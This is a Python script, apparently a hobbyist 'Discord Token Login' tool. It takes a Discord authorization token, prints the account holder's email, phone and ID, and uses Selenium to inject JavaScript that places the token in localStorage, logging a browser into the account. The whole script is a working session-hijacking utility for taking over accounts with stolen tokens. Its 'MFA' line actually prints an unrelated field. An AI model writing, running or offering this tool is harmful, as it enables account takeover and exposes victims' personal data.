import json, requests, os, platform, struct, re, subprocess, sys
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from colorama import Fore
from colorama import Style

## Find ChromeDriver here: https://googlechromelabs.github.io/chrome-for-testing/known-good-versions-with-downloads.json

os_name = platform.system()
arch = '64' if struct.calcsize("P") * 8 == 64 else '32'

if os_name == 'Windows':
    os_version = 'win' + arch
elif os_name == 'Darwin':
    machine = platform.machine()
    if 'arm' in machine:
        os_version = 'mac-arm' + arch
    else:
        os_version = 'mac-x' + arch
elif os_name == 'Linux':
    os_version = 'linux' + arch
else:
    os_version = 'unknown'

def get_chrome_version():
    cmds = {
        'win': r'wmic datafile where name="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" get Version /value',
        'linux': 'google-chrome --version',
        'darwin': r'/Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome --version'
    }
    
    cmd = cmds.get(sys.platform[:3])
    if not cmd:
        return "Unsupported OS"
    
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout
    version = re.search(r'(\d+\.\d+\.\d+\.\d+)', result)
    
    return version.group(1) if version else "Version not found"

latest_link = f'https://storage.googleapis.com/chrome-for-testing-public/{get_chrome_version()}/{os_version}/chromedriver-{os_version}.zip'

def err():
    print('\n')
    res = requests.get(
        "https://chromedriver.storage.googleapis.com/LATEST_RELEASE")
    ver = res.text
    download_url = f'https://storage.googleapis.com/chrome-for-testing-public/{ver}/{os_version}/chrome-{os_version}.zip'
    print(
        f"[ ERROR ] Driver not found \n1. please download latest chromedriver from this link and put .exe file in this directory \n2. make sure your chrome is updated \n[{Fore.YELLOW} {latest_link} ] ")
    print('\n')
    input()
    print('\n')
    exit()

if not os.path.exists("chromedriver.exe"):
    err()

def clear():
    print("\n" * 100)
    startmenu()

print('''
             ..ooo@@@XXX%%%xx..
          .oo@@XXX%x%xxx..     ` .
        .o@XX%%xx..               ` .
      o@X%..                  ..ooooooo
    .@X%x.                 ..o@@^^   ^^@@o
  .ooo@@@@@@ooo..      ..o@@^          @X%
  o@@^^^     ^^^@@@ooo.oo@@^             %
 xzI    -*--      ^^^o^^        --*-     %
 @@@o     ooooooo^@@^o^@X^@oooooo     .X%x
I@@@@@@@@@XX%%xx  ( o@o )X%x@ROMBASED@@@X%x   
I@@@@XX%%xx  oo@@@@X% @@X%x   ^^^@@@@@@@X%x
 @X%xx     o@@@@@@@X% @@XX%%x  )    ^^@X%x
  ^   xx o@@@@@@@@Xx  ^ @XX%%x    xxx
        o@@^^^ooo I^^ I^o ooo   .  x
        oo @^ IX      I   ^X  @^ oo
        IX     U  .        V     IX
         V     .           .     V                        .
''')
print("Welcome To Discord Token Login       Dev:H4ndshake")
print("")
request = requests.Session()
token = input("Enter Token > ")
headers = {
    'Authorization': token,
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
}

print('''
 [1] Token Info        [2] Login To Token

''')

def tokenLogin(token):
    try:
        src = request.get('https://discord.com/api/v6/users/@me', headers=headers, timeout=10)
        if src.status_code == 403 or src.status_code == 401:
            print("Token Is Invalid")
            startmenu()
        else:
            opts = webdriver.ChromeOptions()
            opts.add_experimental_option("detach", True)
            service = Service('chromedriver.exe')
            driver = webdriver.Chrome(service=service, options=opts)
            script = """
                function login(token) {
                    setInterval(() => {
                        document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                    }, 50);
                    setTimeout(() => {
                        location.reload();
                    }, 2500);
                }
            """
            driver.get("https://discord.com/login")
            driver.execute_script(script + f'\nlogin("{token}")')
    except Exception as e:
        err()


def tokeninfo():
    src = request.get(
        'https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10)
    response = json.loads(src.content)

    if src.status_code == 403:
        print("[*] Token Is Invalid")
        startmenu()
    elif src.status_code == 401:
        print("[*] Token Is Invalid")
        startmenu()
    else:
        print(f"Token Is Valid")
        infotk = f'''\n   Name: {response['username']}#{response['discriminator']}   ID: {response['id']}\n   Email: {response['email']}   Phone: {response['phone']}\n   Verified: {response['verified']}          MFA: {response['nsfw_allowed']}\n   AvatarURL: https://cdn.discordapp.com/avatars/{response['id']}/{response['avatar']}.png?size=1024'''
        print(infotk)
        startmenu()

def startmenu():
    keywrd = input("Command > ")
    if keywrd == "exit":
        print("Bye !")
        exit()
    elif keywrd == "clear":
        clear()
    elif keywrd == "1":
        tokeninfo()
        startmenu()
    elif keywrd == "2":
        tokenLogin(token)
    else:
        print(" [!] Command Not Found !")
        startmenu()

startmenu()